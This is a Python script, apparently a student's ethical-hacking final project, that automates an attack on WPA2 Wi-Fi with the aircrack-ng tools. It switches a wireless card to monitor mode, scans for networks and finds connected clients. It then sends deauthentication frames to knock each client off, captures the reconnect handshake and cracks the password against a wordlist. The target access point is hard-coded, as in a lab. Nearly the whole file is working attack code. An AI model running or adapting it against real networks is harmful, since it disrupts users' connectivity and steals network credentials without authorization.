#!/usr/bin/env python

from __future__ import print_function

import os, subprocess, select, time, signal
from multiprocessing import Process

SECONDS = 5
#WORDLIST = "/usr/share/wordlists/rockyou.txt"
WORDLIST = "/root/Documents/cs378/ethical_hacking_final_project/test.txt"

def check_root():

    if os.geteuid() != 0:
        print('need to be root')
        exit(0)

def setup_network():

    out = subprocess.check_output("service network-manager stop".split(" "))
    out = subprocess.check_output("airmon-ng check kill".split(" "))
    out = subprocess.check_output("/etc/init.d/avahi-daemon stop".split(" "))

    # Get a monitor mode network device from iwconfig
    p2 = subprocess.Popen("iwconfig".split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p2.communicate()
    result = err + out
    managed = ""
    interfaces = []
    for r in result.split("\n\n"):
        interface = r.split()[0]
        interfaces.append(interface)
        if "Managed" or "Promiscous" in r:
            managed = interface
    print("Using {} as the interface".format(managed))

    out = subprocess.check_output("ifconfig {} down".format(managed).split(" "))
    out = subprocess.check_output("airmon-ng start {}".format(managed).split(" "))
    #TODO: programmatically get the new monitor mode network
    mon_managed = managed + "mon"
    return mon_managed

def reset_network(interface_name):
    print("Reseting network...")
    out = subprocess.check_output("airmon-ng stop {}".format(interface_name).split(" "))
    out = subprocess.check_output("service network-manager restart".split(" "))
    print("Reset Network")

def send_deauth(bssid, dmac, interface_name, seconds):
    print("")
    print("SECONDS: {}".format(seconds))
    print("sending {0} deauth(s) to DMAC:{1} in BSSID:{2}".format(seconds, dmac, bssid["BSSID"]))
    #print("aireplay-ng -0 {0} -a {1} -c {2} {3}".format(seconds, bssid["BSSID"], dmac, interface_name[:-3]))
    print("aireplay-ng -0 {0} -a {1} -c {2} {3}".format(seconds, bssid["BSSID"], dmac, interface_name))
    #cmd = "aireplay-ng -0 " + str(seconds) + " -a " + bssid["BSSID"] + " " + interface_name[:-3]
    cmd = "aireplay-ng -0 " + str(seconds) + " -a " + bssid["BSSID"] + " -c " + dmac + " " + interface_name + " --ignore-negative-one"
    subprocess.call(cmd, shell=True)
    #aireplay-ng -0 1 -a <bssid - MAC address of access point> -c <dmac - MAC address of destination> <monitor mode adapter>
    #p = subprocess.Popen("aireplay-ng -0 {0} -a {1} -c {2} {3}".format(seconds, bssid["BSSID"], dmac, interface_name).split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    #p.wait()

def crack_password(wordlist, bssid, pcap_file):
    p = subprocess.Popen("aircrack-ng -w {0} -b {1} {2}".format(wordlist, bssid["BSSID"], pcap_file).split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p.communicate()
    p.wait()
    #print(out, err)
    #print(out.split("\n"))
    print(out)
    """
    data = out.split("\n")
    if len(data) < 7:
        print("Did not find password for BSSID:{0}\t ESSID: {1}".format(bssid["BSSID"], bssid["ESSID"]))
    else:
        for d in data:
            if "KEY FOUND" in d:
                print("Password for BSSID:{0}\t ESSID:{1} is {2}".format(bssid["BSSID"], bssid["ESSID"], d))
    """

def capture_handshake(bssid, interface_name):
    #print("iwconfig {0} channel {1}".format(interface_name, bssid["CH"]))
    #out = subprocess.check_output("iwconfig {0} channel {1}".format(interface_name, bssid["CH"]).split(" "))
    print("airmon-ng stop {0}".format(interface_name))
    out = subprocess.check_output("airmon-ng stop {0}".format(interface_name).split(" "))
    print("airmon-ng start {0} {1}".format(interface_name[:-3], bssid["CH"]))
    out = subprocess.check_output("airmon-ng start {0} {1}".format(interface_name[:-3], bssid["CH"]).split(" "))
    time.sleep(2)
    #print("airmon-ng start {0} {1}".format(interface_name, bssid["CH"]))
    #out = subprocess.check_output("airmon-ng start {0} {1}".format(interface_name, bssid["CH"]).split(" "))
    #print("Capturing packets for {0} on channel {1} [BSSID: {2}]..."\
    #        .format(bssid["ESSID"], bssid["CH"], bssid["BSSID"]))
    print("airodump-ng -c {0} --bssid {1} -w handshake_{1} {2}".format(bssid["CH"], bssid["BSSID"], interface_name))
    p = subprocess.Popen("airodump-ng -c {0} --bssid {1} -w handshake_{1} {2}"\
            .format(bssid["CH"], bssid["BSSID"], interface_name).split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    #os.system("airodump-ng --bssid %s --channel %s -w captured_packet %s" %(bssid["BSSID"], bssid["CH"], interface_name))
    dmac_map = {}
    processes = []
    _poll = select.poll()
    _poll.register(p.stderr)

    out = ""
    start = time.time()
    while time.time() - start < 15:
        rlist = _poll.poll()
        for fd, event in rlist:
            out += os.read(fd, 2048)

    _poll.unregister(p.stderr)
    
    #out2arr = out.split("\n")
    out2arr = out.split("\x1b[J\x1b[1;1H\n")
    #out2arr = out.split("BSSID              STATION            PWR   Rate    Lost    Frames  Probe")
    #print(out2arr)
    for i in range(1, len(out2arr)):
        try:
            #print(out2arr[i].split("BSSID              STATION            PWR   Rate    Lost    Frames  Probe"))
            info = out2arr[i].split("BSSID              STATION            PWR   Rate    Lost    Frames  Probe")[1]
        except Exception as e:
            print("exception")
            continue
        #print(info)
        #print(lines[4:])
        #print(info.split("\n"))
        #print(info.split("\n"))
        lines = info.split("\n")[2:-1]
        #print(lines)
        #print(len(lines))
        #print(info.strip())
        #print(lines[2:-1])
        #print(len(info))
        #print('~~~~~')
        for line in lines:
            #print(line)
            #data = line.strip().split()
            data = line.split()
            dmac = data[1]
            #print(dmac)

            if dmac not in dmac_map:
                print("new dmac: {}".format(dmac))
                dmac_map[dmac] = True
                """
                deauth = Process(target = send_deauth, args=(bssid, dmac, interface_name, SECONDS))
                processes.append(deauth)
                deauth.start()
                deauth.join()
                """
    #print("found dmacs")
    for key in dmac_map.keys():
        #print(key)
        send_deauth(bssid, key, interface_name, SECONDS)
    #print(out2arr)

    time.sleep(15)
    #p.terminate()
    p.send_signal(signal.SIGINT)
    

    file_name = "handshake_{0}-01.cap".format(bssid["BSSID"])
    #pwd = Process(target=crack_password, args=(WORDLIST, bssid, file_name))
    #pwd.start()
    crack_password(WORDLIST, bssid, file_name)

def get_bssids(interface_name):
    print('getting bssids')
    p = subprocess.Popen("airodump-ng -a -w testcap -t WPA2 {}".format(interface_name).split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    _poll = select.poll()
    _poll.register(p.stderr)

    start = time.time()
    output = []
    out2 = ""
    while time.time() - start < 5:
        rlist = _poll.poll()
        for fd, event in rlist:
            out2 += os.read(fd, 2048)

    _poll.unregister(p.stderr)
    #p.terminate()
    p.send_signal(signal.SIGINT)

    bssid_map = {}
    processes = []
    out2arr = out2.split("\x1b[J\x1b[1;1H\n")
    for i in range(1, len(out2arr)):
        info = out2arr[i].split("BSSID              STATION            PWR   Rate    Lost    Frames  Probe")[0]
        #print(lines[4:])
        lines = info.split("\n")[4:-2]
        for line in lines:
            #print(line)
            data = line.split()

            bssid = {
                    "BSSID": data[0], 
                    "Pwr": data[1],
                    "Beacons": data[2],
                    "Data": data[3],
                    "NUM_PER_S": data[4],
                    "CH": data[5],
                    "MB": data[6],
                    "ENC": data[7],
                    "CIPHER": "",
                    "AUTH": "",
            }
            if bssid["ENC"] == "WPA2":
                bssid["CIPHER"] = data[8]
                bssid["AUTH"] = data[9]
                bssid["ESSID"] = ' '.join(data[10:])
                #print(bssid["ESSID"])
            elif bssid["ENC"] == "WEP":
                bssid["CIPHER"] = data[8]
                bssid["ESSID"] = ' '.join(data[9:])
            elif bssid["ENC"] == "OPN" or bssid["ENC"] == "WPA":
                bssid["ESSID"] = data[8:]
            else:
                #print("don't recognize enc type: %s" %bssid["ENC"])
                #print(line)
                bssid["ESSID"] = ' '.join(data[8:])

            #if bssid["ENC"] == "WPA2" and bssid["BSSID"] not in bssid_map:
            if bssid["ENC"] == "WPA2" and bssid["BSSID"] == "98:F1:70:09:FE:71" and bssid["BSSID"] not in bssid_map:
                bssid_map[bssid["BSSID"]] = bssid
                print(bssid["ESSID"])

    print("found bssids")
    for key in bssid_map.keys():
        print("")
        print(bssid_map[key]["ESSID"])
        capture_handshake(bssid_map[key], interface_name)

def run():
    check_root()
    os.system("rm testcap*")
    os.system("rm handshake*")
    interface = setup_network()
    try:
        get_bssids(interface)
    finally:
        time.sleep(1)
        reset_network(interface)

if __name__ == "__main__": 
    run()
